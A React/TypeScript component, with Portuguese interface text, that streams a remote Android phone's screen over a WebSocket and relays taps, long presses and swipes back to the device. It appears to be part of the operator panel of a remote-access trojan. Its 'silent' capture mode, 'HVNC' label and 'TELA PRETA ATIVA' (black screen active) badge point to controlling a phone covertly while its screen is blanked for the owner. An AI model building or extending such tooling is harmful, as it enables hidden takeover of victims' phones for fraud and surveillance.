import { useEffect, useRef, useState, useCallback } from 'react';
import { getApiBaseUrl } from '@/services/api';
import type { ScreenDimensions } from '@/types';

interface DeviceScreenProps {
  deviceId: string;
  onCommand: (command: any) => void;
  isBlackScreenActive: boolean;
  onConnectionStatusChange?: (status: 'online' | 'offline' | 'stale') => void;
  captureMethod?: 'standard' | 'silent';
  killerFrameOnPointerMove?: boolean;
  onRequestFrame?: () => void;
  onVncStatusChange?: (active: boolean, method: string) => void;
}

const DEFAULT_DIMENSIONS: ScreenDimensions = { width: 360, height: 780, scale: 1 };

function detectFrameMime(buffer: ArrayBuffer): string {
  const b = new Uint8Array(buffer, 0, 4);
  if (b.length >= 2 && b[0] === 0xff && b[1] === 0xd8) return 'image/jpeg';
  if (b.length >= 4 && b[0] === 0x52 && b[1] === 0x49 && b[2] === 0x46 && b[3] === 0x46) return 'image/webp';
  return 'image/jpeg';
}

// Strip Android binary frame header: [0x01][4-byte-len][JPEG]
// Server should already strip this, but guard anyway
function extractJpegPayload(buffer: ArrayBuffer): ArrayBuffer {
  const view = new Uint8Array(buffer, 0, Math.min(5, buffer.byteLength));
  if (view[0] === 0x01 && buffer.byteLength > 5) {
    const len = (view[1] << 24) | (view[2] << 16) | (view[3] << 8) | view[4];
    if (len > 0 && len <= buffer.byteLength - 5) {
      return buffer.slice(5, 5 + len);
    }
  }
  return buffer;
}

interface TouchVisual {
  id: string;
  x: number;
  y: number;
  endX?: number;
  endY?: number;
  type: 'click' | 'long_press' | 'swipe';
  timestamp: number;
}

export default function DeviceScreen({
  deviceId,
  onCommand,
  isBlackScreenActive,
  onConnectionStatusChange,
  captureMethod = 'standard',
  killerFrameOnPointerMove = false,
  onRequestFrame,
  onVncStatusChange,
}: DeviceScreenProps) {
  const canvasRef        = useRef<HTMLCanvasElement>(null);
  const containerRef     = useRef<HTMLDivElement>(null);
  const phoneFrameRef    = useRef<HTMLDivElement>(null);

  const [, setDimensions]        = useState<ScreenDimensions>(DEFAULT_DIMENSIONS);
  const [isLoading, setIsLoading]              = useState(true);
  const [isConnectTimeout, setIsConnectTimeout] = useState(false);
  const [streamStatus, setStreamStatus]         = useState<'connecting' | 'online' | 'offline'>('connecting');
  const [isDeviceOffline, setIsDeviceOffline]   = useState(false);
  const [vncActive, setVncActive]               = useState(false);

  const [touchVisuals, setTouchVisuals] = useState<TouchVisual[]>([]);
  const [showTouchVisualizer, setShowTouchVisualizer] = useState(true);

  const addTouchVisual = useCallback((touch: Omit<TouchVisual, 'id' | 'timestamp'>) => {
    const id = Math.random().toString(36).substring(2, 9);
    const item: TouchVisual = { ...touch, id, timestamp: Date.now() };
    setTouchVisuals((prev) => [...prev.slice(-12), item]);
    setTimeout(() => setTouchVisuals((prev) => prev.filter((t) => t.id !== id)), 2500);
  }, []);

  // ── Refs (hot path — no re-render per frame) ──────────────────────────────
  const wsRef                = useRef<WebSocket | null>(null);
  const reconnectRef         = useRef<number | null>(null);
  const staleCheckRef        = useRef<number | null>(null);
  const reconnectAttemptsRef = useRef<number>(0);
  const ctxRef               = useRef<CanvasRenderingContext2D | null>(null);
  const lastFrameTsRef       = useRef<number | null>(null);
  const isDeviceOfflineRef   = useRef(false);
  const hasReceivedFrameRef  = useRef(false);
  const frameSizeRef         = useRef<{ w: number; h: number } | null>(null);
  const renderTokenRef       = useRef(0);
  const captureMethodRef     = useRef(captureMethod);
  const dimensionsRef        = useRef<ScreenDimensions>(DEFAULT_DIMENSIONS);
  const fpsLabelRef          = useRef<HTMLSpanElement>(null);

  // Double-buffer decode: pendingFrameRef holds the NEXT frame while decoding current
  const pendingFrameRef      = useRef<ArrayBuffer | null>(null);
  const isDecodingRef        = useRef(false);
  const rafRef               = useRef<number | null>(null);

  // Real metrics
  const fpsWindowRef         = useRef({ count: 0, start: Date.now() });
  const lastFrameDeltaRef    = useRef<number>(0);
  const lastKillerFrameReqRef = useRef(0);

  // Gesture refs
  const touchStartRef    = useRef<{ x: number; y: number; clientX: number; clientY: number; time: number } | null>(null);
  const longPressTimerRef = useRef<number | null>(null);
  const isLongPressedRef  = useRef(false);

  useEffect(() => { captureMethodRef.current = captureMethod; }, [captureMethod]);

  // ── 8-second connect timeout ───────────────────────────────────────────────
  useEffect(() => {
    const t = window.setTimeout(() => {
      if (!hasReceivedFrameRef.current) setIsConnectTimeout(true);
    }, 8000);
    return () => window.clearTimeout(t);
  }, [deviceId]);

  // ── Real FPS + frame delta display (500ms interval) ───────────────────────
  useEffect(() => {
    const id = window.setInterval(() => {
      const win = fpsWindowRef.current;
      const elapsed = Date.now() - win.start;
      const fps = elapsed > 0 ? (win.count * 1000) / elapsed : 0;
      win.count = 0;
      win.start = Date.now();

      const delta = lastFrameDeltaRef.current;
      const latencyLabel = delta > 0 ? `${Math.round(delta)}ms` : '—';

      if (fpsLabelRef.current) {
        fpsLabelRef.current.textContent = `${fps.toFixed(1)} FPS · ${latencyLabel}`;
      }
    }, 500);
    return () => window.clearInterval(id);
  }, []);

  // ── Canvas context (desynchronized + imageSmoothingQuality) ──────────────
  const getCanvasContext = useCallback((canvas: HTMLCanvasElement) => {
    if (!ctxRef.current) {
      ctxRef.current = canvas.getContext('2d', { alpha: false, desynchronized: true });
      if (ctxRef.current) {
        ctxRef.current.imageSmoothingEnabled  = true;
        ctxRef.current.imageSmoothingQuality  = 'low'; // 'low' fastest; enough for VNC
      }
    }
    return ctxRef.current;
  }, []);

  // ── Layout update (only when frame dimensions change) ────────────────────
  const updateLayoutIfNeeded = useCallback((imgW: number, imgH: number) => {
    const prev = frameSizeRef.current;
    if (prev && prev.w === imgW && prev.h === imgH) return;
    frameSizeRef.current = { w: imgW, h: imgH };

    const containerW = containerRef.current?.parentElement?.clientWidth  || containerRef.current?.clientWidth  || 550;
    const containerH = containerRef.current?.parentElement?.clientHeight || containerRef.current?.clientHeight || 800;
    const ar = imgH / imgW;
    const maxH = Math.max(400, containerH - 20);
    const maxW = Math.max(550, containerW - 20);

    let w = Math.min(containerW, maxW);
    let h = w * ar;
    if (h > maxH && maxH > 200) { h = maxH; w = h / ar; }

    const next: ScreenDimensions = { width: w, height: h, scale: w / imgW };
    dimensionsRef.current = next;
    setDimensions(next);

    const canvas = canvasRef.current;
    if (canvas) { canvas.style.width = '100%'; canvas.style.height = '100%'; }
    if (phoneFrameRef.current) {
      phoneFrameRef.current.style.width    = '100%';
      phoneFrameRef.current.style.height   = '100%';
      phoneFrameRef.current.style.maxHeight = '100%';
    }
  }, []);

  // ── Frame decode + draw (double-buffer: always decode latest pending) ─────
  const processNextFrame = useCallback(() => {
    const frame = pendingFrameRef.current;
    if (!frame) { isDecodingRef.current = false; return; }

    pendingFrameRef.current = null;
    isDecodingRef.current   = true;

    const canvas = canvasRef.current;
    if (!canvas) { isDecodingRef.current = false; return; }

    const ctx = getCanvasContext(canvas);
    if (!ctx)   { isDecodingRef.current = false; return; }

    const payload  = extractJpegPayload(frame);
    const mimeType = detectFrameMime(payload);
    const blob     = new Blob([payload], { type: mimeType });
    const token    = ++renderTokenRef.current;

    createImageBitmap(blob, {
      premultiplyAlpha: 'none',
      colorSpaceConversion: 'none',   // skip color profile conversion — fastest
    })
      .then((bitmap) => {
        if (token !== renderTokenRef.current || !canvasRef.current) {
          bitmap.close();
          return;
        }

        // Resize canvas backing store only when dimensions change
        if (canvas.width !== bitmap.width || canvas.height !== bitmap.height) {
          canvas.width  = bitmap.width;
          canvas.height = bitmap.height;
          updateLayoutIfNeeded(bitmap.width, bitmap.height);
        }

        ctx.drawImage(bitmap, 0, 0);
        bitmap.close();

        // Real frame delta (inter-frame latency)
        const now = Date.now();
        if (lastFrameTsRef.current != null) {
          lastFrameDeltaRef.current = now - lastFrameTsRef.current;
        }
        fpsWindowRef.current.count += 1;
        lastFrameTsRef.current = now;

        if (!hasReceivedFrameRef.current) {
          hasReceivedFrameRef.current = true;
          setIsLoading(false);
        }
        if (isDeviceOfflineRef.current) {
          isDeviceOfflineRef.current = false;
          setIsDeviceOffline(false);
          onConnectionStatusChange?.('online');
        }
      })
      .catch(() => { /* corrupt frame — discard silently */ })
      .finally(() => {
        isDecodingRef.current = false;
        // If a newer frame arrived while we were decoding, process it immediately
        if (pendingFrameRef.current) {
          rafRef.current = requestAnimationFrame(processNextFrame);
        }
      });
  }, [getCanvasContext, updateLayoutIfNeeded, onConnectionStatusChange]);

  const drawFrame = useCallback((buffer: ArrayBuffer) => {
    pendingFrameRef.current = buffer;
    if (!isDecodingRef.current) {
      if (rafRef.current) cancelAnimationFrame(rafRef.current);
      rafRef.current = requestAnimationFrame(processNextFrame);
    }
    // If currently decoding: pendingFrameRef already updated with latest frame.
    // processNextFrame's .finally() will pick it up — zero extra scheduling needed.
  }, [processNextFrame]);

  // ── WebSocket stream ───────────────────────────────────────────────────────
  useEffect(() => {
    if (!deviceId) return;
    let cancelled = false;

    const wsProtocol = getApiBaseUrl().startsWith('https') ? 'wss' : 'ws';
    const wsBase     = getApiBaseUrl().replace(/^https?/, wsProtocol);

    const connect = () => {
      if (cancelled) return;
      const token = localStorage.getItem('admin_token') || localStorage.getItem('token') || '';
      if (!token) { setStreamStatus('offline'); return; }

      setStreamStatus('connecting');
      const ws = new WebSocket(`${wsBase}/ws/dashboard/${deviceId}?token=${token}`);
      ws.binaryType = 'arraybuffer';
      wsRef.current = ws;

      ws.onopen = () => {
        if (cancelled) return;
        reconnectAttemptsRef.current = 0;
        setStreamStatus('online');
        isDeviceOfflineRef.current = false;
        setIsDeviceOffline(false);
        onConnectionStatusChange?.('online');
        onRequestFrame?.();

        // On connect: request frame immediately + set quality optimised for speed
        try {
          onCommand?.({ action: 'SET_SILENT_VNC_QUALITY', quality: 25 });
          onCommand?.({ action: 'REQUEST_VNC_FRAME' });
        } catch (_) {}
      };

      ws.onmessage = (event) => {
        if (cancelled) return;

        // JSON text frame — status updates from server
        if (typeof event.data === 'string') {
          try {
            const msg = JSON.parse(event.data);
            if (msg.type === 'SILENT_VNC_STATUS') {
              const active = Boolean(msg.active);
              setVncActive(active);
              onVncStatusChange?.(active, msg.method ?? 'silent');
            }
          } catch (_) {}
          return;
        }

        // Empty keepalive ping — ignore
        if (event.data instanceof ArrayBuffer && event.data.byteLength === 0) return;

        // Binary frame
        if (event.data instanceof ArrayBuffer) {
          if (isDeviceOfflineRef.current) {
            isDeviceOfflineRef.current = false;
            setIsDeviceOffline(false);
            onConnectionStatusChange?.('online');
          }
          drawFrame(event.data);
        } else if (event.data instanceof Blob) {
          event.data.arrayBuffer().then((buf) => {
            if (buf.byteLength > 0 && !cancelled) drawFrame(buf);
          });
        }
      };

      ws.onerror  = () => ws.close();

      ws.onclose = (event) => {
        if (cancelled) return;
        setStreamStatus('offline');
        onConnectionStatusChange?.('offline');
        const attempt   = reconnectAttemptsRef.current;
        reconnectAttemptsRef.current = attempt + 1;
        const baseDelay = event.code === 1000 ? 2000 : 800;
        const delay     = Math.min(baseDelay * Math.pow(1.6, Math.min(attempt, 5)), 12000);
        reconnectRef.current = window.setTimeout(connect, delay);
      };
    };

    connect();

    return () => {
      cancelled = true;
      if (reconnectRef.current) { window.clearTimeout(reconnectRef.current); reconnectRef.current = null; }
      if (wsRef.current)        { wsRef.current.close(); wsRef.current = null; }
      if (rafRef.current)       { cancelAnimationFrame(rafRef.current); rafRef.current = null; }
      renderTokenRef.current++;
      ctxRef.current = null;
      reconnectAttemptsRef.current = 0;
    };
  }, [deviceId, drawFrame, onConnectionStatusChange]);

  // ── Stale frame detection (tightened: 15s warn, 30s offline) ─────────────
  useEffect(() => {
    const checkStale = () => {
      if (!lastFrameTsRef.current || streamStatus !== 'online') return;
      const age = Date.now() - lastFrameTsRef.current;

      if (age > 15000) {
        try { onRequestFrame?.(); onCommand?.({ action: 'REQUEST_VNC_FRAME' }); } catch (_) {}
      }
      if (age > 30000 && !isDeviceOfflineRef.current) {
        isDeviceOfflineRef.current = true;
        setIsDeviceOffline(true);
        onConnectionStatusChange?.('stale');
      }
    };

    staleCheckRef.current = window.setInterval(checkStale, 5000);
    return () => { if (staleCheckRef.current) window.clearInterval(staleCheckRef.current); };
  }, [onConnectionStatusChange, streamStatus]);

  // ── Coordinate mapping (normalised 0.0–1.0) ───────────────────────────────
  const getDeviceCoordinates = useCallback((clientX: number, clientY: number) => {
    const canvas = canvasRef.current;
    if (!canvas) return { x: 0, y: 0, normX: 0, normY: 0 };
    const rect  = canvas.getBoundingClientRect();
    const normX = Math.max(0, Math.min(1, (clientX - rect.left)  / rect.width));
    const normY = Math.max(0, Math.min(1, (clientY - rect.top)   / rect.height));
    return { x: normX, y: normY, normX, normY };
  }, []);

  // ── Pointer handlers ───────────────────────────────────────────────────────
  const handlePointerDown = useCallback((e: React.PointerEvent<HTMLCanvasElement>) => {
    try { e.currentTarget.setPointerCapture(e.pointerId); } catch (_) {}
    const coords = getDeviceCoordinates(e.clientX, e.clientY);
    touchStartRef.current   = { x: coords.normX, y: coords.normY, clientX: e.clientX, clientY: e.clientY, time: Date.now() };
    isLongPressedRef.current = false;
    if (longPressTimerRef.current) clearTimeout(longPressTimerRef.current);
    longPressTimerRef.current = window.setTimeout(() => {
      onCommand({ action: 'LONG_PRESS', x: coords.normX, y: coords.normY, duration: 500, scale: 'vnc_norm' });
      addTouchVisual({ x: coords.normX, y: coords.normY, type: 'long_press' });
      isLongPressedRef.current  = true;
      longPressTimerRef.current = null;
    }, 500);
  }, [getDeviceCoordinates, onCommand, addTouchVisual]);

  const handlePointerUp = useCallback((e: React.PointerEvent<HTMLCanvasElement>) => {
    try { e.currentTarget.releasePointerCapture(e.pointerId); } catch (_) {}
    const touchStart = touchStartRef.current;
    if (!touchStart) return;
    if (longPressTimerRef.current) { clearTimeout(longPressTimerRef.current); longPressTimerRef.current = null; }
    if (isLongPressedRef.current)  { touchStartRef.current = null; isLongPressedRef.current = false; return; }

    const coords    = getDeviceCoordinates(e.clientX, e.clientY);
    const deltaX    = e.clientX - touchStart.clientX;
    const deltaY    = e.clientY - touchStart.clientY;
    const deltaTime = Date.now() - touchStart.time;
    const distance  = Math.sqrt(deltaX ** 2 + deltaY ** 2);

    if (distance < 10) {
      onCommand({ action: 'CLICK', x: coords.normX, y: coords.normY, scale: 'vnc_norm' });
      addTouchVisual({ x: coords.normX, y: coords.normY, type: 'click' });
    } else {
      onCommand({ action: 'SWIPE', x1: touchStart.x, y1: touchStart.y, x2: coords.normX, y2: coords.normY, duration: Math.max(100, deltaTime), scale: 'vnc_norm' });
      addTouchVisual({ x: touchStart.x, y: touchStart.y, endX: coords.normX, endY: coords.normY, type: 'swipe' });
    }
    touchStartRef.current = null;
  }, [getDeviceCoordinates, onCommand, addTouchVisual]);

  const handlePointerMove = useCallback((e: React.PointerEvent<HTMLCanvasElement>) => {
    const touchStart = touchStartRef.current;
    if (!touchStart) return;
    const dist = Math.sqrt((e.clientX - touchStart.clientX) ** 2 + (e.clientY - touchStart.clientY) ** 2);
    if (dist > 15 && longPressTimerRef.current) { clearTimeout(longPressTimerRef.current); longPressTimerRef.current = null; }
    if (killerFrameOnPointerMove && onRequestFrame) {
      const now = Date.now();
      if (now - lastKillerFrameReqRef.current >= 400) { lastKillerFrameReqRef.current = now; onRequestFrame(); }
    }
  }, [killerFrameOnPointerMove, onRequestFrame]);

  const handlePointerCancel = useCallback((e: React.PointerEvent<HTMLCanvasElement>) => {
    try { e.currentTarget.releasePointerCapture(e.pointerId); } catch (_) {}
    if (longPressTimerRef.current) { clearTimeout(longPressTimerRef.current); longPressTimerRef.current = null; }
    touchStartRef.current    = null;
    isLongPressedRef.current = false;
  }, []);

  // ── Render ─────────────────────────────────────────────────────────────────
  return (
    <div ref={containerRef} className="relative flex items-center justify-center w-full h-full max-h-full">
      <div
        ref={phoneFrameRef}
        className="relative bg-black rounded-[32px] overflow-hidden cursor-crosshair flex items-center justify-center mx-auto transition-all w-full h-full border border-[#162744]"
        style={{ width: '100%', height: '100%', maxHeight: '100%' }}
      >
        {/* Notch */}
        <div className="absolute top-2.5 left-1/2 -translate-x-1/2 w-24 h-4 bg-black rounded-full z-30 border border-[#162744] flex items-center justify-center gap-2 shadow-inner pointer-events-none">
          <div className="w-2.5 h-2.5 rounded-full bg-slate-900 border border-slate-700" />
          <div className="w-1.5 h-1.5 rounded-full bg-slate-800" />
        </div>

        <div className="relative w-full h-full bg-slate-950 rounded-[32px] overflow-hidden flex items-center justify-center" data-screen="true">

          {/* Loading overlay */}
          {isLoading && (
            <div className="absolute inset-0 flex items-center justify-center bg-slate-900/90 z-20">
              <div className="text-white text-center">
                {isConnectTimeout ? (
                  <>
                    <div className="text-3xl mb-2">📡</div>
                    <p className="text-xs font-semibold text-amber-300">Aguardando frames VNC...</p>
                    <p className="text-[10px] text-slate-400 mt-1">Verifique se a captura está ativa no dispositivo</p>
                  </>
                ) : (
                  <>
                    <div className="animate-spin rounded-full h-10 w-10 border-b-2 border-cyan-400 mx-auto mb-2" />
                    <p className="text-xs font-semibold text-cyan-300">Conectando...</p>
                  </>
                )}
              </div>
            </div>
          )}

          <div className="relative w-full h-full overflow-hidden flex items-center justify-center">
            <canvas
              ref={canvasRef}
              className="w-full h-full cursor-crosshair touch-none"
              style={{ width: '100%', height: '100%', imageRendering: 'auto' }}
              onPointerDown={handlePointerDown}
              onPointerUp={handlePointerUp}
              onPointerMove={handlePointerMove}
              onPointerCancel={handlePointerCancel}
              onContextMenu={(e) => e.preventDefault()}
            />

            {/* Touch visualizer */}
            {showTouchVisualizer && (
              <div className="absolute inset-0 pointer-events-none z-40 overflow-hidden">
                {touchVisuals.map((t) => (
                  <div key={t.id} className="absolute inset-0 pointer-events-none">
                    {t.type === 'click' && (
                      <div
                        className="absolute transform -translate-x-1/2 -translate-y-1/2 flex items-center justify-center pointer-events-none z-50"
                        style={{ left: `${t.x * 100}%`, top: `${t.y * 100}%` }}
                      >
                        <span className="absolute w-16 h-16 rounded-full border-2 border-cyan-300 animate-ping opacity-90 shadow-[0_0_25px_#00f0ff]" />
                        <span className="absolute w-10 h-10 rounded-full border border-purple-400 animate-pulse opacity-80" />
                        <span className="w-5 h-5 rounded-full bg-gradient-to-r from-cyan-400 to-blue-500 shadow-[0_0_20px_#00f0ff] border-2 border-white flex items-center justify-center">
                          <span className="w-1.5 h-1.5 rounded-full bg-white animate-ping" />
                        </span>
                        <span className="absolute top-6 bg-[#04091a]/95 border border-cyan-400/80 text-cyan-200 text-[10px] font-mono font-black px-2 py-0.5 rounded-md shadow-[0_0_15px_rgba(0,240,255,0.5)] backdrop-blur-md whitespace-nowrap uppercase tracking-wider z-50">
                          ⚡ TOQUE ({(t.x * 100).toFixed(0)}%, {(t.y * 100).toFixed(0)}%)
                        </span>
                      </div>
                    )}
                    {t.type === 'long_press' && (
                      <div
                        className="absolute transform -translate-x-1/2 -translate-y-1/2 flex items-center justify-center pointer-events-none z-50"
                        style={{ left: `${t.x * 100}%`, top: `${t.y * 100}%` }}
                      >
                        <span className="absolute w-20 h-20 rounded-full border-2 border-amber-400 animate-ping opacity-100 shadow-[0_0_30px_#f59e0b]" />
                        <span className="w-7 h-7 rounded-full bg-gradient-to-r from-amber-500 to-red-600 shadow-[0_0_25px_#f59e0b] border-2 border-white animate-bounce" />
                        <span className="absolute top-7 bg-amber-950/95 border border-amber-400 text-amber-200 text-[10px] font-mono font-black px-2 py-0.5 rounded-md shadow-[0_0_15px_rgba(245,158,11,0.5)] backdrop-blur-md whitespace-nowrap uppercase tracking-wider z-50">
                          🎯 PRESSÃO LONGA
                        </span>
                      </div>
                    )}
                    {t.type === 'swipe' && t.endX !== undefined && t.endY !== undefined && (
                      <svg className="absolute inset-0 w-full h-full pointer-events-none z-40">
                        <defs>
                          <linearGradient id={`sg-${t.id}`} x1={`${t.x * 100}%`} y1={`${t.y * 100}%`} x2={`${t.endX * 100}%`} y2={`${t.endY * 100}%`}>
                            <stop offset="0%"   stopColor="#00f0ff" stopOpacity="1" />
                            <stop offset="100%" stopColor="#a855f7" stopOpacity="0.8" />
                          </linearGradient>
                        </defs>
                        <line x1={`${t.x * 100}%`} y1={`${t.y * 100}%`} x2={`${t.endX * 100}%`} y2={`${t.endY * 100}%`}
                          stroke={`url(#sg-${t.id})`} strokeWidth="5" strokeDasharray="8 4" className="animate-pulse" />
                        <circle cx={`${t.x * 100}%`}    cy={`${t.y * 100}%`}    r="8" fill="#00f0ff" className="animate-ping" />
                        <circle cx={`${t.endX * 100}%`} cy={`${t.endY * 100}%`} r="9" fill="#a855f7" stroke="#ffffff" strokeWidth="2" />
                      </svg>
                    )}
                  </div>
                ))}
              </div>
            )}
          </div>

          {/* Touch visualizer toggle */}
          <button
            type="button"
            onClick={() => setShowTouchVisualizer(!showTouchVisualizer)}
            className={`absolute top-2 left-2 px-3 py-1.5 rounded-xl text-[11px] font-mono font-bold z-50 shadow-lg backdrop-blur-md transition-all cursor-pointer flex items-center gap-1.5 ${
              showTouchVisualizer
                ? 'bg-cyan-500/30 text-cyan-200 border border-cyan-400 shadow-[0_0_15px_rgba(6,182,212,0.4)] animate-pulse'
                : 'bg-slate-900/90 text-slate-400 border border-slate-700 hover:text-white'
            }`}
          >
            <span className="w-2 h-2 rounded-full bg-cyan-400 animate-ping" />
            <span>🎯 TOQUES: {showTouchVisualizer ? 'VISÍVEIS' : 'OCULTOS'}</span>
          </button>

          {/* Black screen badge */}
          {isBlackScreenActive && (
            <div className="absolute top-2 left-2 bg-gradient-to-r from-red-600 to-amber-600 text-white px-3 py-1 rounded-full text-[10px] font-bold animate-pulse z-30 shadow-[0_0_10px_rgba(239,68,68,0.5)] border border-red-400/40 pointer-events-none">
              🔴 TELA PRETA ATIVA
            </div>
          )}

          {/* Real FPS + frame delta */}
          {!isLoading && (
            <>
              <span
                ref={fpsLabelRef}
                className="absolute top-8 right-2 px-2 py-0.5 rounded-full text-[10px] font-mono font-bold z-30 bg-slate-950/80 text-cyan-300 border border-cyan-500/30 shadow shadow-cyan-500/20 backdrop-blur-md"
              >
                — FPS
              </span>

              {/* Capture method + VNC status */}
              <div
                className={`absolute top-2 right-2 px-2 py-0.5 rounded-full text-[10px] font-bold z-30 shadow backdrop-blur-md flex items-center gap-1 ${
                  vncActive
                    ? 'bg-gradient-to-r from-green-700 to-cyan-600 text-white border border-cyan-400/40 shadow-green-500/30'
                    : captureMethod === 'silent'
                    ? 'bg-gradient-to-r from-blue-600 to-cyan-500 text-white border border-cyan-400/40 shadow-blue-500/30'
                    : 'bg-gradient-to-r from-blue-600 to-cyan-600 text-white border border-cyan-400/40 shadow-cyan-500/30'
                }`}
              >
                <span className={`w-1.5 h-1.5 rounded-full ${vncActive ? 'bg-green-300 animate-pulse' : 'bg-cyan-300'}`} />
                {vncActive ? 'VNC ATIVO' : captureMethod === 'silent' ? 'Silencioso' : 'HVNC'}
              </div>
            </>
          )}

          {/* Connection status badge */}
          {streamStatus !== 'online' && (
            <div className="absolute bottom-4 left-4 bg-slate-950/80 border border-cyan-500/30 backdrop-blur-md text-cyan-300 text-[10px] px-3 py-1 rounded-full shadow-lg">
              {streamStatus === 'connecting' ? '🔄 Conectando...' : '🔄 Reconectando...'}
            </div>
          )}

          {/* Device offline overlay */}
          {isDeviceOffline && (
            <div className="absolute inset-0 flex items-center justify-center bg-[#030712]/95 z-40 backdrop-blur-md p-4">
              <div className="text-center text-white p-6 max-w-sm border border-cyan-500/30 rounded-2xl bg-[#091124] shadow-[0_0_35px_rgba(6,182,212,0.25)] relative overflow-hidden">
                <div className="absolute top-0 left-0 right-0 h-[2px] bg-gradient-to-r from-transparent via-cyan-400 to-transparent" />
                <div className="text-5xl mb-3 animate-pulse">📴</div>
                <h3 className="text-lg font-black uppercase tracking-wider mb-1 text-cyan-300 font-mono">Dispositivo Sem Resposta</h3>
                <p className="text-slate-400 text-xs mb-4 leading-relaxed">
                  Sem novas imagens no último intervalo. A conexão pode ter oscilado ou o dispositivo entrou em repouso.
                </p>
                <div className="space-y-2.5">
                  <button
                    onClick={() => {
                      isDeviceOfflineRef.current = false;
                      setIsDeviceOffline(false);
                      setStreamStatus('connecting');
                      try {
                        onRequestFrame?.();
                        onCommand?.({ action: 'REQUEST_VNC_FRAME' });
                        onCommand?.({ action: 'SET_SILENT_VNC_QUALITY', quality: 25 });
                        onConnectionStatusChange?.('online');
                        if (wsRef.current) wsRef.current.close();
                      } catch (_) {}
                    }}
                    className="w-full py-2.5 bg-gradient-to-r from-cyan-600 to-blue-600 hover:from-cyan-500 hover:to-blue-500 text-white font-bold text-xs rounded-xl shadow-lg shadow-cyan-500/25 border border-cyan-400/30 transition-all uppercase tracking-wider font-mono flex items-center justify-center gap-2 cursor-pointer active:scale-95"
                  >
                    <span>⚡ Reconectar &amp; Forçar Resposta</span>
                  </button>
                  <div className="bg-cyan-950/50 border border-cyan-500/20 rounded-xl p-2 text-cyan-300 text-[10px] font-mono flex items-center justify-center gap-2">
                    <span className="w-2 h-2 rounded-full bg-cyan-400 animate-ping" />
                    <span>Reconexão automática ativa em segundo plano...</span>
                  </div>
                </div>
              </div>
            </div>
          )}
        </div>

        {/* Home bar */}
        <div className="absolute bottom-2 left-1/2 -translate-x-1/2 w-20 h-1 bg-slate-700/70 rounded-full z-30 pointer-events-none" />
      </div>
    </div>
  );
}
